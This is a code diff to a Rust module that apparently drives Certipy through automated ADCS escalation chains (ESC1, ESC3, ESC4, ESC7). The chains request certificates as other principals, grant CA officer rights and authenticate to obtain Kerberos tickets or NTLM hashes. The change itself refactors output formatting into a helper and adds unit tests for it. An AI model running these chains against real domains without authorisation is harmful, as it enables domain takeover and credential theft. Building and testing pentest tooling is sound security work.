@@ -7,6 +7,24 @@ use crate::args::{optional_bool, optional_str, required_str};
 use crate::executor::CommandBuilder;
 use crate::ToolOutput;
 
+/// Concatenate the stdout/stderr of a chained tool invocation under `=== <label> ===`
+/// headers so an operator can tell which sub-step produced which output. Pure
+/// formatting — kept separate from the chain drivers (which shell out to certipy
+/// and are not unit-testable without subprocess mocks).
+fn render_chain_output(steps: &[(&str, &ToolOutput)]) -> (String, String) {
+    let stdout = steps
+        .iter()
+        .map(|(label, out)| format!("=== {label} ===\n{}", out.stdout))
+        .collect::<Vec<_>>()
+        .join("\n");
+    let stderr = steps
+        .iter()
+        .map(|(label, out)| format!("=== {label} ===\n{}", out.stderr))
+        .collect::<Vec<_>>()
+        .join("\n");
+    (stdout, stderr)
+}
+
 /// Enumerate ADCS certificate templates and CAs using Certipy.
 ///
 /// Required args: `username`, `domain`, `dc_ip`
@@ -344,7 +362,6 @@ pub async fn certipy_esc7_full_chain(args: &Value) -> Result<ToolOutput> {
     let user_at_domain = format!("{username}@{domain}");
     let mut outputs = Vec::new();
 
-    // Step 1: Add self as CA officer (certipy v5 requires principal as arg)
     let mut step1_cmd = CommandBuilder::new("certipy")
         .arg("ca")
         .flag("-username", &user_at_domain)
@@ -358,7 +375,6 @@ pub async fn certipy_esc7_full_chain(args: &Value) -> Result<ToolOutput> {
     let step1 = step1_cmd.timeout_secs(120).execute().await?;
     outputs.push(("Add Officer", step1));
 
-    // Step 2: Request cert with SubCA template (will be denied/pending)
     let ts = std::time::SystemTime::now()
         .duration_since(std::time::UNIX_EPOCH)
         .map(|d| d.as_millis())
@@ -418,7 +434,6 @@ pub async fn certipy_esc7_full_chain(args: &Value) -> Result<ToolOutput> {
         }
     };
 
-    // Step 3: Issue the pending request using ManageCA rights
     let mut step3_cmd = CommandBuilder::new("certipy")
         .arg("ca")
         .flag("-username", &user_at_domain)
@@ -432,7 +447,6 @@ pub async fn certipy_esc7_full_chain(args: &Value) -> Result<ToolOutput> {
     let step3 = step3_cmd.timeout_secs(120).execute().await?;
     outputs.push(("Issue Request", step3));
 
-    // Step 4: Retrieve the issued certificate
     let step4 = CommandBuilder::new("certipy")
         .arg("req")
         .flag("-username", &user_at_domain)
@@ -448,7 +462,7 @@ pub async fn certipy_esc7_full_chain(args: &Value) -> Result<ToolOutput> {
     let step4_out = step4.timeout_secs(120).execute().await?;
     outputs.push(("Retrieve Cert", step4_out));
 
-    // Step 4b: If certipy couldn't create a PFX (key mismatch), combine manually
+    // If certipy couldn't create a PFX (key mismatch), combine manually.
     let pfx_path = format!("{out_name}.pfx");
     let crt_path = format!("{out_name}.crt");
     let key_path = format!("{out_name}.key");
@@ -469,7 +483,6 @@ pub async fn certipy_esc7_full_chain(args: &Value) -> Result<ToolOutput> {
         outputs.push(("Combine PFX", combine));
     }
 
-    // Step 5: Authenticate with the retrieved PFX
     let _ = tokio::process::Command::new("sh")
         .arg("-c")
         .arg("rm -f *.ccache 2>/dev/null")
@@ -585,18 +598,11 @@ pub async fn certipy_esc4_full_chain(args: &Value) -> Result<ToolOutput> {
     }
     let auth_output = certipy_auth(&auth_args).await?;
 
-    let combined_stdout = format!(
-        "=== Step 1: Template Modification ===\n{}\n\
-         === Step 2: Certificate Request ===\n{}\n\
-         === Step 3: Authentication ===\n{}",
-        template_output.stdout, request_output.stdout, auth_output.stdout
-    );
-    let combined_stderr = format!(
-        "=== Step 1: Template Modification ===\n{}\n\
-         === Step 2: Certificate Request ===\n{}\n\
-         === Step 3: Authentication ===\n{}",
-        template_output.stderr, request_output.stderr, auth_output.stderr
-    );
+    let (combined_stdout, combined_stderr) = render_chain_output(&[
+        ("Template Modification", &template_output),
+        ("Certificate Request", &request_output),
+        ("Authentication", &auth_output),
+    ]);
 
     // The chain succeeds only if the final auth step succeeded.
     Ok(ToolOutput {
@@ -663,7 +669,6 @@ pub async fn certipy_esc3_full_chain(args: &Value) -> Result<ToolOutput> {
     let target_out = format!("target_{ts}");
     let target_pfx = format!("{target_out}.pfx");
 
-    // --- Step 1: enroll the agent cert ---
     let agent_output = CommandBuilder::new("certipy")
         .arg("req")
         .flag("-username", &user_at_domain)
@@ -686,7 +691,6 @@ pub async fn certipy_esc3_full_chain(args: &Value) -> Result<ToolOutput> {
         );
     }
 
-    // --- Step 2: enroll on-behalf-of using the agent cert ---
     // `domain\\principal` form is what certipy expects for `-on-behalf-of`
     // (NetBIOS-style). The single-backslash escape in the format string
     // becomes a literal `\` on the command line.
@@ -707,16 +711,15 @@ pub async fn certipy_esc3_full_chain(args: &Value) -> Result<ToolOutput> {
         .execute()
         .await?;
     if !request_output.success {
+        let agent_label = format!("Agent enrollment ({agent_template})");
+        let on_behalf_label = format!("On-behalf-of {on_behalf_target} via {on_behalf_template}");
+        let (stdout, stderr) = render_chain_output(&[
+            (&agent_label, &agent_output),
+            (&on_behalf_label, &request_output),
+        ]);
         return Ok(ToolOutput {
-            stdout: format!(
-                "=== Step 1: Agent enrollment ({agent_template}) ===\n{}\n\
-                 === Step 2: on-behalf-of {on_behalf_target} via {on_behalf_template} ===\n{}",
-                agent_output.stdout, request_output.stdout
-            ),
-            stderr: format!(
-                "=== Step 1 stderr ===\n{}\n=== Step 2 stderr ===\n{}",
-                agent_output.stderr, request_output.stderr
-            ),
+            stdout,
+            stderr,
             exit_code: request_output.exit_code,
             success: false,
         });
@@ -727,7 +730,6 @@ pub async fn certipy_esc3_full_chain(args: &Value) -> Result<ToolOutput> {
         );
     }
 
-    // --- Step 3: authenticate with the on-behalf-of cert ---
     // certipy auth writes <subject>.ccache in CWD; clear stale .ccache to
     // avoid the interactive overwrite prompt that kills non-interactive
     // runs (matches what `certipy_auth` does at module level).
@@ -747,16 +749,13 @@ pub async fn certipy_esc3_full_chain(args: &Value) -> Result<ToolOutput> {
         .execute()
         .await?;
 
-    let combined_stdout = format!(
-        "=== Step 1: Agent enrollment ({agent_template}) ===\n{}\n\
-         === Step 2: on-behalf-of {on_behalf_target} via {on_behalf_template} ===\n{}\n\
-         === Step 3: certipy auth ===\n{}",
-        agent_output.stdout, request_output.stdout, auth_output.stdout
-    );
-    let combined_stderr = format!(
-        "=== Step 1 stderr ===\n{}\n=== Step 2 stderr ===\n{}\n=== Step 3 stderr ===\n{}",
-        agent_output.stderr, request_output.stderr, auth_output.stderr
-    );
+    let agent_label = format!("Agent enrollment ({agent_template})");
+    let on_behalf_label = format!("On-behalf-of {on_behalf_target} via {on_behalf_template}");
+    let (combined_stdout, combined_stderr) = render_chain_output(&[
+        (&agent_label, &agent_output),
+        (&on_behalf_label, &request_output),
+        ("certipy auth", &auth_output),
+    ]);
     Ok(ToolOutput {
         stdout: combined_stdout,
         stderr: combined_stderr,
@@ -803,7 +802,7 @@ pub async fn certipy_esc1_full_chain(args: &Value) -> Result<ToolOutput> {
     let out_name = format!("esc1_{ts}");
     let pfx_name = format!("{out_name}.pfx");
 
-    // --- Step 1: request the cert with -upn + -sid for KB5014754 strict mapping ---
+    // KB5014754 strict mapping requires -upn + -sid on the request.
     let request_output = CommandBuilder::new("certipy")
         .arg("req")
         .flag("-username", &user_at_domain)
@@ -826,7 +825,6 @@ pub async fn certipy_esc1_full_chain(args: &Value) -> Result<ToolOutput> {
         anyhow::bail!("certipy req reported success but {pfx_name} was not produced");
     }
 
-    // --- Step 2: authenticate with the cert → NTLM hash ---
     let auth_output = CommandBuilder::new("certipy")
         .arg("auth")
         .flag("-pfx", &pfx_name)
@@ -837,15 +835,10 @@ pub async fn certipy_esc1_full_chain(args: &Value) -> Result<ToolOutput> {
         .execute()
         .await?;
 
-    let combined_stdout = format!(
-        "=== Step 1: certipy req (ESC1, upn={upn}, sid={sid}) ===\n{}\n\
-         === Step 2: certipy auth ({pfx_name}) ===\n{}",
-        request_output.stdout, auth_output.stdout
-    );
-    let combined_stderr = format!(
-        "=== Step 1 stderr ===\n{}\n=== Step 2 stderr ===\n{}",
-        request_output.stderr, auth_output.stderr
-    );
+    let req_label = format!("certipy req (ESC1, upn={upn}, sid={sid})");
+    let auth_label = format!("certipy auth ({pfx_name})");
+    let (combined_stdout, combined_stderr) =
+        render_chain_output(&[(&req_label, &request_output), (&auth_label, &auth_output)]);
     Ok(ToolOutput {
         stdout: combined_stdout,
         stderr: combined_stderr,
@@ -1336,5 +1329,67 @@ mod tests {
             "ca": "contoso-CA", "pfx_path": "/tmp/admin.pfx"
         });
         assert!(super::certipy_esc4_full_chain(&args).await.is_ok());
+    }
+
+    // --- render_chain_output ---
+
+    fn mk_output(stdout: &str, stderr: &str) -> crate::ToolOutput {
+        crate::ToolOutput {
+            stdout: stdout.into(),
+            stderr: stderr.into(),
+            exit_code: Some(0),
+            success: true,
+        }
+    }
+
+    #[test]
+    fn render_chain_output_concatenates_steps_under_labeled_headers() {
+        let a = mk_output("alpha-out", "alpha-err");
+        let b = mk_output("bravo-out", "bravo-err");
+        let (stdout, stderr) = super::render_chain_output(&[("Alpha", &a), ("Bravo", &b)]);
+        assert_eq!(stdout, "=== Alpha ===\nalpha-out\n=== Bravo ===\nbravo-out");
+        assert_eq!(stderr, "=== Alpha ===\nalpha-err\n=== Bravo ===\nbravo-err");
+    }
+
+    #[test]
+    fn render_chain_output_empty_steps_yields_empty_strings() {
+        let (stdout, stderr) = super::render_chain_output(&[]);
+        assert!(stdout.is_empty());
+        assert!(stderr.is_empty());
+    }
+
+    #[test]
+    fn render_chain_output_single_step_omits_join_separator() {
+        let only = mk_output("solo-out", "solo-err");
+        let (stdout, stderr) = super::render_chain_output(&[("Only", &only)]);
+        assert_eq!(stdout, "=== Only ===\nsolo-out");
+        assert_eq!(stderr, "=== Only ===\nsolo-err");
+    }
+
+    #[test]
+    fn render_chain_output_preserves_step_order() {
+        let first = mk_output("1", "");
+        let second = mk_output("2", "");
+        let third = mk_output("3", "");
+        let (stdout, _) = super::render_chain_output(&[
+            ("first", &first),
+            ("second", &second),
+            ("third", &third),
+        ]);
+        let first_idx = stdout.find("first").unwrap();
+        let second_idx = stdout.find("second").unwrap();
+        let third_idx = stdout.find("third").unwrap();
+        assert!(first_idx < second_idx);
+        assert!(second_idx < third_idx);
+    }
+
+    #[test]
+    fn render_chain_output_handles_empty_stdout_or_stderr_fields() {
+        let out_only = mk_output("data", "");
+        let err_only = mk_output("", "boom");
+        let (stdout, stderr) =
+            super::render_chain_output(&[("Out", &out_only), ("Err", &err_only)]);
+        assert_eq!(stdout, "=== Out ===\ndata\n=== Err ===\n");
+        assert_eq!(stderr, "=== Out ===\n\n=== Err ===\nboom");
     }
 }
